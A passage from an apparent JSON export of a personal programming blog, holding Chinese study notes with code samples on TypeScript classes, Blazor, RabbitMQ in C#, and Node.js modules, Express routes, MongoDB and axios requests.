extends Article&#123; constructor (title:string ,con:string) &#123; super(title,con) this.temp3=&quot;1&quot; &#125;&#125; 12345678910111213141516class User&#123; private _password :string =&#x27;&#x27; get password():string&#123; return &#x27;****&#x27; &#125; set password (newPass:string) &#123; this._password = newPass &#125;&#125;const u1 = new User()console.log(u1.password) 🪛abstract12345678910111213141516171819202122232425262728abstract class Animal&#123; abstract name:string abstract makeSound():void move():void &#123; console.log(&#x27;mmm&#x27;) &#125;&#125;class Cat extends Animal&#123; name:string=&#x27;miao&#x27; makeSound(): void &#123; console.log(&quot;miaomiao&quot;) &#125;&#125;class Dog extends Animal&#123; name:string=&#x27;wang&#x27; makeSound(): void &#123; console.log(&quot;wangwang&quot;) &#125;&#125; 🧲implements1234567891011121314151617181920212223interface Animal&#123; name:string get sound():string makesound():void&#125;interface AgeI&#123; age:number&#125;class Dog implements Animal,AgeI&#123; name: string = &#x27;wang&#x27; age:number = 2 get sound()&#123; return &#x27;&#x27; &#125; makesound(): void &#123; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"helloworld","slug":"helloworld","permalink":"https://banjinmei.github.io/tags/helloworld/"},{"name":"Typescript","slug":"Typescript","permalink":"https://banjinmei.github.io/tags/Typescript/"},{"name":"datatype","slug":"datatype","permalink":"https://banjinmei.github.io/tags/datatype/"},{"name":"interface","slug":"interface","permalink":"https://banjinmei.github.io/tags/interface/"},{"name":"type","slug":"type","permalink":"https://banjinmei.github.io/tags/type/"},{"name":"T","slug":"T","permalink":"https://banjinmei.github.io/tags/T/"},{"name":"extends","slug":"extends","permalink":"https://banjinmei.github.io/tags/extends/"},{"name":"class","slug":"class","permalink":"https://banjinmei.github.io/tags/class/"},{"name":"abstract","slug":"abstract","permalink":"https://banjinmei.github.io/tags/abstract/"},{"name":"implements","slug":"implements","permalink":"https://banjinmei.github.io/tags/implements/"}],"author":"mu"},{"title":".NET Blazor","slug":"NET-Blazor","date":"2024-05-18T15:10:13.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/18/NET-Blazor/","permalink":"https://banjinmei.github.io/2024/05/18/NET-Blazor/","excerpt":"","text":"Blazor 是一个使用 C#、HTML 和 CSS 构建交互式 Web UI 的开源框架，支持服务器端和客户端运行，允许开发者利用 C# 和 .NET 生态来创建 Web 应用。 🌱Createcarete Blazor Web Program.cs 是启动服务器以及在其中配置应用服务和中间件的应用的入口点。在 Components 目录中: App.razor 为应用的根组件。Routes.razor 配置 Blazor 路由器。Pages 目录包含应用的一些示例网页。BlazorApp.csproj 定义应用项目及其依赖项，且可以通过双击解决方案资源管理器中的 BlazorApp 项目节点进行查看。Properties 目录中的 launchSettings.json 文件为本地开发环境定义不同的配置文件设置。创建项目时会自动分配端口号并将其保存在此文件上。 🪴Runpages home.razor 1234567@page &quot;/&quot;&lt;PageTitle&gt;Home&lt;/PageTitle&gt;&lt;h1&gt;Hello, world m qqqqq&lt;/h1&gt;hihihi 🌴Countercounter.razor 12345678910111213141516171819@page &quot;/counter&quot;@rendermode InteractiveServer&lt;PageTitle&gt;Counter&lt;/PageTitle&gt;&lt;h1&gt;Counter&lt;/h1&gt;&lt;p role=&quot;status&quot;&gt;Current count: @currentCount&lt;/p&gt;&lt;button class=&quot;btn btn-primary&quot; @onclick=&quot;IncrementCount&quot;&gt;Click me&lt;/button&gt;@code &#123; private int currentCount = 0; private void IncrementCount() &#123; currentCount++; &#125;&#125; 像Vue 🌳Componenthome &gt; component 1234567891011@page &quot;/&quot;&lt;PageTitle&gt;Home&lt;/PageTitle&gt;&lt;h1&gt;Hello, world m qqqqq&lt;/h1&gt;hihihi &lt;Counter /&gt; &lt;Weather&gt; &lt;/Weather&gt; Parameter修改counter 123456789101112131415@code &#123; private int currentCount = 0; [Parameter] public int IncrementAmount &#123; get; set; &#125; = 1; private void IncrementCount() &#123; // currentCount++; currentCount += IncrementAmount; &#125;&#125; 123&lt;Counter IncrementAmount=&quot;2&quot; /&gt; 点击即增加2 data 1234567&lt;input @bind=&quot;text&quot; /&gt;&lt;button @onclick=&quot;() =&gt; text = string.Empty&quot;&gt;Clear&lt;/button&gt;&lt;p&gt;@text&lt;/p&gt;@code &#123; string text = &quot;&quot;;&#125; 🌻ToDoListnavComponents&#x2F;Layout&#x2F;NavMenu.razor 12345&lt;div class=&quot;nav-item px-3&quot;&gt; &lt;NavLink class=&quot;nav-link&quot; href=&quot;todo&quot;&gt; &lt;span class=&quot;bi bi-list-nested-nav-menu&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Todo &lt;/NavLink&gt;&lt;/div&gt; TodoItem123456public class TodoItem&#123; public string? Title &#123; get; set; &#125; public bool IsDone &#123; get; set; &#125; = false;&#125; AddItem1234567891011121314151617181920212223242526&lt;ul&gt; @foreach (var todo in todos) &#123; &lt;li&gt;@todo.Title&lt;/li&gt; &#125;&lt;/ul&gt;&lt;br /&gt;&lt;input @bind=&quot;newTodo&quot; /&gt;&lt;button @onclick=&quot;AddTodo&quot;&gt;Add todo&lt;/button&gt;@code &#123; private List&lt;TodoItem&gt; todos = new(); string newTodo = &quot;&quot;; void AddTodo() &#123; if (!string.IsNullOrWhiteSpace(newTodo)) &#123; todos.Add(new TodoItem &#123; Title = newTodo &#125;); newTodo = string.Empty; &#125; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET RabbitMQ NOTE","slug":"NET-RabbitMQ","date":"2024-05-18T15:05:20.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/18/NET-RabbitMQ/","permalink":"https://banjinmei.github.io/2024/05/18/NET-RabbitMQ/","excerpt":"","text":"setup rabbitmqdocker run –name&#x3D;rabbit -p 15672:15672 -p 5672:5672 -e RABBITMQ_DEFAULT_USER&#x3D;admin -e RABBITMQ_DEFAULT_PASS&#x3D;xxx -d rabbitmq:management ip:15672 nuget RabbitMQ.Client Send 12345678910111213141516171819//1.1.实例化连接工厂var factory = new ConnectionFactory() &#123; HostName = &quot;localhost&quot; &#125;;//2. 建立连接using (var connection = factory.CreateConnection())&#123; //3. 创建信道 using (var channel = connection.CreateModel()) &#123; //4. 申明队列 channel.QueueDeclare(queue: &quot;hello&quot;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. 构建byte消息数据包 string message = args.Length &gt; 0 ? args[0] : &quot;Hello RabbitMQ!&quot;; var body = Encoding.UTF8.GetBytes(message); //6. 发送数据包 channel.BasicPublish(exchange: &quot;&quot;, routingKey: &quot;hello&quot;, basicProperties: null, body: body); Console.WriteLine(&quot; [x] Sent &#123;0&#125;&quot;, message); &#125;&#125; Received 12345678910111213141516171819202122232425262728//1.实例化连接工厂var factory = new ConnectionFactory() &#123; HostName = &quot;localhost&quot; &#125;;//2. 建立连接using (var connection = factory.CreateConnection())&#123; //3. 创建信道 using (var channel = connection.CreateModel()) &#123; //4. 申明队列 channel.QueueDeclare(queue: &quot;hello&quot;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. 构造消费者实例 var consumer = new EventingBasicConsumer(channel); //6. 绑定消息接收后的事件委托 consumer.Received += (model, ea) =&gt; &#123; var message = Encoding.UTF8.GetString(ea.Body.ToArray()); Console.WriteLine(&quot; [x] Received &#123;0&#125;&quot;, message); Thread.Sleep(6000);//模拟耗时 Console.WriteLine(&quot; [x] Done&quot;); &#125;; //7. 启动消费者 channel.BasicConsume(queue: &quot;hello&quot;, autoAck: true, consumer: consumer); Console.WriteLine(&quot; Press [enter] to exit.&quot;); Console.ReadLine(); &#125;&#125; ErrRabbitMQ.Client.Exceptions.BrokerUnreachableException:“None of the specified endpoints were reachable”IP host ErrAuthenticationFailureException: ACCESS_REFUSED - Login was refused using authentication mechanism 12new ConnectionFactory() &#123; HostName = &quot;localhost&quot; ,UserName=&quot;admin&quot;,Password=&quot;xxx&quot;&#125; 消息持久化 1234567891011121314//... //4. 申明队列(指定durable:true,告知rabbitmq对消息进行持久化) channel.QueueDeclare(queue: &quot;hellooo&quot;, durable: true, exclusive: false, autoDelete: false, arguments: null); //将消息标记为持久性 - 将IBasicProperties.SetPersistent设置为true var properties = channel.CreateBasicProperties(); properties.Persistent = true; //5. 构建byte消息数据包 string message = args.Length &gt; 0 ? args[0] : &quot;Hello RabbitMQ!&quot;; var body = Encoding.UTF8.GetBytes(message); //6. 发送数据包(指定basicProperties) channel.BasicPublish(exchange: &quot;&quot;, routingKey: &quot;hello&quot;, basicProperties: properties, body: body); //6. 发送数据包 channel.BasicPublish(exchange: &quot;&quot;, routingKey: &quot;hello&quot;, basicProperties: null, body: body); Console.WriteLine(&quot; [x] Sent &#123;0&#125;&quot;, message); durable: true","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".netS","slug":"netS","permalink":"https://banjinmei.github.io/tags/netS/"}],"author":"mu"},{"title":"Nodejs2","slug":"Nodejs-Base2","date":"2024-05-17T13:00:03.000Z","updated":"2025-01-21T02:13:47.650Z","comments":true,"path":"2024/05/17/Nodejs-Base2/","permalink":"https://banjinmei.github.io/2024/05/17/Nodejs-Base2/","excerpt":"","text":"📘 utilutil1const util = require(&#x27;util&#x27;); 123456789util.isArray([])util.isRegExp(/some regexp/)util.isDate(new Date()) // true util.isDate(Date()) // false (without &#x27;new&#x27; returns a String) os12345678910111213141516var os = require(&quot;os&quot;);// CPU 的字节序console.log(&#x27;endianness : &#x27; + os.endianness());// 操作系统名console.log(&#x27;type : &#x27; + os.type());// 操作系统名console.log(&#x27;platform : &#x27; + os.platform());// 系统内存总量console.log(&#x27;total memory : &#x27; + os.totalmem() + &quot; bytes.&quot;);// 操作系统空闲内存量console.log(&#x27;free memory : &#x27; + os.freemem() + &quot; bytes.&quot;); path123456789101112// 格式化路径console.log(&#x27;normalization : &#x27; + path.normalize(&#x27;/test/test1//2slashes/1slash/tab/..&#x27;));// 连接路径console.log(&#x27;joint path : &#x27; + path.join(&#x27;/test&#x27;, &#x27;test1&#x27;, &#x27;2slashes/1slash&#x27;, &#x27;tab&#x27;, &#x27;..&#x27;));// 转换为绝对路径console.log(&#x27;resolve : &#x27; + path.resolve(&#x27;main.js&#x27;));// 路径中文件的后缀名console.log(&#x27;ext name : &#x27; + path.extname(&#x27;main.js&#x27;)); net12345678910111213//clientvar net = require(&#x27;net&#x27;);var client = net.connect(&#123;port: 6001&#125;, function() &#123; console.log(&#x27;连接到服务器！&#x27;); &#125;);client.on(&#x27;data&#x27;, function(data) &#123; console.log(data.toString()); client.end();&#125;);client.on(&#x27;end&#x27;, function() &#123; console.log(&#x27;断开与服务器的连接&#x27;);&#125;); 12345678910111213//servervar net = require(&#x27;net&#x27;);var server = net.createServer(function(connection) &#123; console.log(&#x27;client connected&#x27;); connection.on(&#x27;end&#x27;, function() &#123; console.log(&#x27;客户端关闭连接&#x27;); &#125;); connection.write(&#x27;Hello World!\\r\\n&#x27;); connection.pipe(connection);&#125;);server.listen(8080, function() &#123; console.log(&#x27;server is listening&#x27;);&#125;); dns1234567891011var dns = require(&#x27;dns&#x27;);dns.lookup(&#x27;www.qq.com&#x27;, function onLookup(err, address, family) &#123; console.log(&#x27;ip 地址:&#x27;, address); dns.reverse(address, function (err, hostnames) &#123; console.log(&#x27;反向解析 &#x27; + address + &#x27;: &#x27; + JSON.stringify(hostnames));&#125;); &#125;); 📕file123456789101112131415161718192021222324//readvar fs = require(&#x27;fs&#x27;);fs.stat(&#x27;E:/vue/nodejs/hello.js&#x27;, function (err, stats) &#123; console.log(stats.isFile()); //true&#125;)var fs = require(&quot;fs&quot;);// 异步读取fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;异步读取: &quot; + data.toString());&#125;);// 同步读取var data = fs.readFileSync(&#x27;input.txt&#x27;);console.log(&quot;同步读取: &quot; + data.toString());console.log(&quot;程序执行完毕。&quot;); 1234567891011121314151617//writevar fs = require(&quot;fs&quot;);fs.writeFile(&#x27;x.txt&#x27;, &#x27;fs.writeFile 写入文件的内容&#x27;, function(err) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;写入成功！&quot;); fs.readFile(&#x27;x.txt&#x27;, function (err, data) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;异步读取文件数据: &quot; + data.toString()); &#125;);&#125;); 📗Get&#x2F;Post12345678var http = require(&#x27;http&#x27;);var url = require(&#x27;url&#x27;);var util = require(&#x27;util&#x27;); http.createServer(function(req, res)&#123; res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain; charset=utf-8&#x27;&#125;); res.end(util.inspect(url.parse(req.url, true)));&#125;).listen(3000); http://localhost:3000/?name=mqm&amp;url=wwwUrl { protocol: null, slashes: null, auth: null, host: null, port: null, hostname: null, hash: null, search: ‘?name&#x3D;mqm&amp;url&#x3D;www’, query: [Object: null prototype] { name: ‘mqm’, url: ‘www’ }, pathname: ‘&#x2F;‘, path: ‘&#x2F;?name&#x3D;mqm&amp;url&#x3D;www’, href: ‘&#x2F;?name&#x3D;mqm&amp;url&#x3D;www’} 123456789101112131415161718192021222324252627282930313233343536//post var http = require(&#x27;http&#x27;);var querystring = require(&#x27;querystring&#x27;); var postHTML = &#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;POST&lt;/title&gt;&lt;/head&gt;&#x27; + &#x27;&lt;body&gt;&#x27; + &#x27;&lt;form method=&quot;post&quot;&gt;&#x27; + &#x27;NAME: &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27; + &#x27;URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27; + &#x27;&lt;input type=&quot;submit&quot;&gt;&#x27; + &#x27;&lt;/form&gt;&#x27; + &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;; http.createServer(function (req, res) &#123; var body = &quot;&quot;; req.on(&#x27;data&#x27;, function (chunk) &#123; body += chunk; &#125;); req.on(&#x27;end&#x27;, function () &#123; // 解析参数 body = querystring.parse(body); // 设置响应头部信息及编码 res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=utf8&#x27;&#125;); if(body.name &amp;&amp; body.url) &#123; // 输出提交的数据 res.write(&quot;NAME：&quot; + body.name); res.write(&quot;&lt;br&gt;&quot;); res.write(&quot;URL：&quot; + body.url); &#125; else &#123; // 输出表单 res.write(postHTML); &#125; res.end(); &#125;);&#125;).listen(3000); 📙Webserver 123456789101112131415161718192021222324252627282930313233var http = require(&#x27;http&#x27;);var fs = require(&#x27;fs&#x27;);var url = require(&#x27;url&#x27;); // 创建服务器http.createServer( function (request, response) &#123; // 解析请求，包括文件名 var pathname = url.parse(request.url).pathname; // 输出请求的文件名 console.log(&quot;Request for &quot; + pathname + &quot; received.&quot;); // 从文件系统中读取请求的文件内容 fs.readFile(pathname.substr(1), function (err, data) &#123; if (err) &#123; console.log(err); // HTTP 状态码: 404 : NOT FOUND // Content Type: text/html response.writeHead(404, &#123;&#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;); &#125;else&#123; // HTTP 状态码: 200 : OK // Content Type: text/html response.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;); // 响应文件内容 response.write(data.toString()); &#125; // 发送响应数据 response.end(); &#125;); &#125;).listen(188); client 123456789101112131415161718192021222324252627var http = require(&#x27;http&#x27;); // 用于请求的选项var options = &#123; host: &#x27;localhost&#x27;, port: &#x27;3276&#x27;, path: &#x27;/api/fileApi/GetByfid?fid=1&#x27; &#125;; // 处理响应的回调函数var callback = function(response)&#123; // 不断更新数据 var body = &#x27;&#x27;; response.on(&#x27;data&#x27;, function(data) &#123; body += data; &#125;); response.on(&#x27;end&#x27;, function() &#123; // 数据接收完成 console.log(body); &#125;);&#125;// 向服务端发送请求var req = http.request(options, callback);req.end(); 📓expressrouter 12345678910111213141516171819202122232425262728293031323334353637383940414243var express = require(&#x27;express&#x27;);var app = express(); // 主页输出 &quot;Hello World&quot;app.get(&#x27;/&#x27;, function (req, res) &#123; console.log(&quot;主页 GET 请求&quot;); res.send(&#x27;Hello GET&#x27;);&#125;) // POST 请求app.post(&#x27;/&#x27;, function (req, res) &#123; console.log(&quot;主页 POST 请求&quot;); res.send(&#x27;Hello POST&#x27;);&#125;) // /del_user 页面响应app.get(&#x27;/del_user&#x27;, function (req, res) &#123; console.log(&quot;/del_user 响应 DELETE 请求&quot;); res.send(&#x27;删除页面&#x27;);&#125;) // /list_user 页面 GET 请求app.get(&#x27;/list_user&#x27;, function (req, res) &#123; console.log(&quot;/list_user GET 请求&quot;); res.send(&#x27;用户列表页面&#x27;);&#125;) // 对页面 abcd, abxcd, ab123cd, 等响应 GET 请求app.get(&#x27;/ab*cd&#x27;, function(req, res) &#123; console.log(&quot;/ab*cd GET 请求&quot;); res.send(&#x27;正则匹配&#x27;);&#125;) var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port) &#125;) Request 对象 - request 对象表示 HTTP 请求，包含了请求查询字符串，参数，内容，HTTP 头部等属性。常见属性有： req.app：当callback为外部文件时，用req.app访问express的实例req.baseUrl：获取路由当前安装的URL路径req.body &#x2F; req.cookies：获得「请求主体」&#x2F; Cookiesreq.fresh &#x2F; req.stale：判断请求是否还「新鲜」req.hostname &#x2F; req.ip：获取主机名和IP地址req.originalUrl：获取原始请求URLreq.params：获取路由的parametersreq.path：获取请求路径req.protocol：获取协议类型req.query：获取URL的查询参数串req.route：获取当前匹配的路由req.subdomains：获取子域名req.accepts()：检查可接受的请求的文档类型req.acceptsCharsets &#x2F; req.acceptsEncodings &#x2F; req.acceptsLanguages：返回指定字符集的第一个可接受字符编码req.get()：获取指定的HTTP请求头req.is()：判断请求头Content-Type的MIME类型 Response 对象 - response 对象表示 HTTP 响应，即在接收到请求时向客户端发送的 HTTP 响应数据。常见属性有： res.app：同req.app一样res.append()：追加指定HTTP头res.set()在res.append()后将重置之前设置的头res.cookie(name，value [，option])：设置Cookieopition: domain &#x2F; expires &#x2F; httpOnly &#x2F; maxAge &#x2F; path &#x2F; secure &#x2F; signedres.clearCookie()：清除Cookieres.download()：传送指定路径的文件res.get()：返回指定的HTTP头res.json()：传送JSON响应res.jsonp()：传送JSONP响应res.location()：只设置响应的Location HTTP头，不设置状态码或者close responseres.redirect()：设置响应的Location HTTP头，并且设置状态码302res.render(view,[locals],callback)：渲染一个view，同时向callback传递渲染后的字符串，如果在渲染过程中有错误发生next(err)将会被自动调用。callback将会被传入一个可能发生的错误以及渲染后的页面，这样就不会自动输出了。res.send()：传送HTTP响应res.sendFile(path [，options] [，fn])：传送指定路径的文件 -会自动根据文件extension设定Content-Typeres.set()：设置HTTP头，传入object可以一次设置多个头res.status()：设置HTTP状态码res.type()：设置Content-Type的MIME类型 staticapp.use(‘&#x2F;public’, express.static(‘public’)); Get 12345678910111213141516171819202122232425262728var express = require(&#x27;express&#x27;);var app = express(); app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;)); app.get(&#x27;/index.html&#x27;, function (req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.html&quot; );&#125;) app.get(&#x27;/process_get&#x27;, function (req, res) &#123; // 输出 JSON 格式 var response = &#123; &quot;first_name&quot;:req.query.first_name, &quot;last_name&quot;:req.query.last_name &#125;; console.log(response); res.end(JSON.stringify(response));&#125;) var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port) &#125;) Post 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var app = express();var bodyParser = require(&#x27;body-parser&#x27;); // 创建 application/x-www-form-urlencoded 编码解析var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;) app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;)); app.get(&#x27;/index.html&#x27;, function (req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.html&quot; );&#125;) app.post(&#x27;/process_post&#x27;, urlencodedParser, function (req, res) &#123; // 输出 JSON 格式 var response = &#123; &quot;first_name&quot;:req.body.first_name, &quot;last_name&quot;:req.body.last_name &#125;; console.log(response); res.end(JSON.stringify(response));&#125;) var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port) &#125;) 📒RESTful API data 123456789101112131415161718192021&#123; &quot;b1&quot; : &#123; &quot;name&quot; : &quot;h&quot;, &quot;con&quot; : &quot;hihihi&quot;, &quot;id&quot;: 1 &#125;, &quot;b2&quot; : &#123; &quot;name&quot; : &quot;b&quot;, &quot;con&quot; : &quot;bobobo&quot;, &quot;id&quot;: 2 &#125;, &quot;b3&quot; : &#123; &quot;name&quot; : &quot;c&quot;, &quot;con&quot; : &quot;cccccc&quot;, &quot;id&quot;: 3 &#125; &#125; list 1234567891011121314151617181920var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);app.get(&#x27;/list&#x27;, function (req, res) &#123; fs.readFile( __dirname + &quot;/&quot; + &quot;books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; console.log( data ); res.end( data ); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;访问地址为 http://%s:%s&quot;, host, port)&#125;) add 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);//添加var bk= &#123; &quot;b4&quot; : &#123; &quot;name&quot; : &quot;b4&quot;, &quot;com&quot; : &quot;this is b4&quot;, &quot;id&quot;: 4 &#125;&#125;app.get(&#x27;/add&#x27;, function (req, res) &#123; // 读取已存在的数据 fs.readFile( __dirname + &quot;/&quot; + &quot;Books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); data[&quot;b4&quot;] = bk[&quot;b4&quot;]; console.log( data ); res.end( JSON.stringify(data)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) id 123456789101112131415161718192021var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);app.get(&#x27;/:id&#x27;, function (req, res) &#123; // 首先我们读取已存在的用户 fs.readFile( __dirname + &quot;/&quot; + &quot;Books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); var user = data[&quot;b&quot; + req.params.id] console.log( user ); res.end( JSON.stringify(user)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;) delete 1234567891011121314151617181920212223242526var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);var id = 2;app.get(&#x27;/delete&#x27;, function (req, res) &#123; // First read existing users. fs.readFile( __dirname + &quot;/&quot; + &quot;Books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); delete data[&quot;b&quot; + id]; console.log( data ); res.end( JSON.stringify(data)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot; http://%s:%s&quot;, host, port)&#125;) 📚️child_processNode 提供了 child_process 模块来创建子进程，方法有： exec - child_process.exec 使用子进程执行命令，缓存子进程的输出，并将子进程的输出以回调函数参数的形式返回。 spawn - child_process.spawn 使用指定的命令行参数创建新进程。 fork - child_process.fork 是 spawn()的特殊形式，用于在子进程中运行的模块，如 fork(‘.&#x2F;son.js’) 相当于 spawn(‘node’, [‘.&#x2F;son.js’]) 。与spawn方法不同的是，fork会在父进程与子进程之间，建立一个通信管道，用于进程之间的通信。 12345678910111213141516171819const fs = require(&#x27;fs&#x27;);const child_process = require(&#x27;child_process&#x27;); for(var i=0; i&lt;10; i++) &#123; var workerProcess = child_process.exec(&#x27;node hello.js &#x27;+i, function (error, stdout, stderr) &#123; if (error) &#123; console.log(error.stack); console.log(&#x27;Error code : &#x27;+error.code); console.log(&#x27;Signal received: &#x27;+error.signal); &#125; console.log(&#x27;stdout: &#x27; + stdout); console.log(&#x27;stderr: &#x27; + stderr); &#125;); workerProcess.on(&#x27;exit&#x27;, function (code) &#123; console.log(&#x27;子进程已退出，退出码 &#x27;+code); &#125;);&#125; spawn() 方法返回流 (stdout &amp; stderr)，在进程返回大量数据时使用。进程一旦开始执行时 spawn() 就开始接收响应。child_process.fork 是 spawn() 方法的特殊形式。 📔mogodbmongodb 1docker run --name mongodb -v /data/mongodb0:/data/db -p 27017:27017 -d mongo npm 1npm install mongodb 进入 MongoDB 容器的 bash shell 命令如下： 12docker exec -it mongodb bash #mongosh --host 127.0.0.1 --port 27017 记得在不再需要时停止和删除容器，可以使用以下命令： 12docker stop mongodb docker rm mongodb 123&gt; show dbs&gt; show tables&gt; db.site.find() create 123456789101112131415161718192021222324252627282930const &#123; MongoClient &#125; = require(&#x27;mongodb&#x27;);// MongoDB连接URIconst uri = &#x27;mongodb://localhost:27017&#x27;;// 创建MongoDB客户端const client = new MongoClient(uri);async function main() &#123; try &#123; // 连接到MongoDB await client.connect(); console.log(&#x27;Connected to MongoDB&#x27;); // 创建数据库 const databaseName = &#x27;myDatabase&#x27;; const db = client.db(databaseName); console.log(`Database &#x27;$&#123;databaseName&#125;&#x27; created`); &#125; catch (error) &#123; console.error(&#x27;Error:&#x27;, error); &#125; finally &#123; // 关闭MongoDB连接 await client.close(); console.log(&#x27;Disconnected from MongoDB&#x27;); &#125;&#125;main().catch(console.error); insert 1234567891011121314151617181920212223242526272829303132333435363738394041const &#123; MongoClient &#125; = require(&#x27;mongodb&#x27;);const uri = &#x27;mongodb://localhost:27017&#x27;;const client = new MongoClient(uri);async function main() &#123; try &#123; await client.connect(); console.log(&#x27;Connected to MongoDB&#x27;); const databaseName = &#x27;myDatabase&#x27;; const db = client.db(databaseName); console.log(`Database &#x27;$&#123;databaseName&#125;&#x27; created`); // 插入数据 const collectionName = &#x27;myCollection&#x27;; const collection = db.collection(collectionName); // 插入单个文档 const insertResult = await collection.insertOne(&#123; name: &#x27;m2&#x27;, age: 18, email: &#x27;m@qq.com&#x27; &#125;); // console.log(&#x27;Inserted document:&#x27;, insertResult.ops[0]); // 查询数据 const queryResult = await collection.find(&#123;&#125;).toArray(); console.log(&#x27;Query result:&#x27;, queryResult); &#125; catch (error) &#123; console.error(&#x27;Error:&#x27;, error); &#125; finally &#123; await client.close(); console.log(&#x27;Disconnected from MongoDB&#x27;); &#125;&#125;main().catch(console.error); update delete 123456789101112131415// 更新数据const filter = &#123; name: &#x27;m&#x27; &#125;;const update = &#123; $set: &#123; age: 15 &#125; &#125;;const updateResult = await collection.updateOne(filter, update);console.log(&#x27;Update result:&#x27;, updateResult.modifiedCount);// 查询数据并打印更新后的结果const queryResult = await collection.find(&#123; name: &#x27;m&#x27; &#125;).toArray();console.log(&#x27;Query result after update:&#x27;, queryResult);// 删除数据const deleteResult = await collection.deleteOne(&#123; name: &#x27;m2&#x27; &#125;);console.log(&#x27;Delete result:&#x27;, deleteResult.deletedCount); asiox 请求 ，header添加 Authorization 值为Bearer xx使用 Node.js 和 Axios 发送请求并在请求头添加 Authorization 值为 Bearer xx 123456789101112131415161718const axios = require(&#x27;axios&#x27;);// 定义请求的 URLconst url = &#x27;https://example.com/api&#x27;;// 定义请求头，添加 Authorization 字段const headers = &#123; &#x27;Authorization&#x27;: &#x27;Bearer xx&#x27;&#125;;// 发送 GET 请求axios.get(url, &#123; headers &#125;) .then(response =&gt; &#123; console.log(response.data); &#125;) .catch(error =&gt; &#123; console.error(error); &#125;); 首先，我们通过 require(‘axios’) 引入 Axios 库，这是一个非常流行的用于在 Node.js 中发送 HTTP 请求的库。然后，我们定义了请求的 url，这里的 https://example.com/api 是一个示例的 API 端点，可以将其替换为实际要请求的地址。接着，我们创建了一个 headers 对象，其中包含 Authorization 字段，其值为 Bearer xx。Bearer 通常用于传递访问令牌（token），可以将 xx 替换为的实际令牌。最后，我们使用 axios.get(url, { headers }) 发送一个 GET 请求。第一个参数是请求的 URL，第二个参数是一个配置对象，其中包含我们定义的 headers。.then() 方法处理请求成功的情况，它接收服务器返回的数据并将其打印到控制台。.catch() 方法处理请求失败的情况，它接收错误对象并将错误信息打印到控制台。如果需要发送 POST 请求，可以使用以下代码： 1234567891011121314151617181920212223const axios = require(&#x27;axios&#x27;);// 定义请求的 URLconst url = &#x27;https://example.com/api&#x27;;// 定义请求头，添加 Authorization 字段const headers = &#123; &#x27;Authorization&#x27;: &#x27;Bearer xx&#x27;&#125;;// 要发送的数据const data = &#123; key: &#x27;value&#x27;&#125;;// 发送 POST 请求axios.post(url, data, &#123; headers &#125;) .then(response =&gt; &#123; console.log(response.data); &#125;) .catch(error =&gt; &#123; console.error(error); &#125;); 与 GET 请求类似，但我们使用 axios.post(url, data, { headers }) 发送 POST 请求。这里的 data 是要发送的数据，它可以是一个对象、数组或其他数据类型。同样，headers 包含 Authorization 信息，url 是请求的地址。 对于 PUT 请求，使用 axios.put(url, data, { headers })。对于 DELETE 请求，使用 axios.delete(url, { headers })。 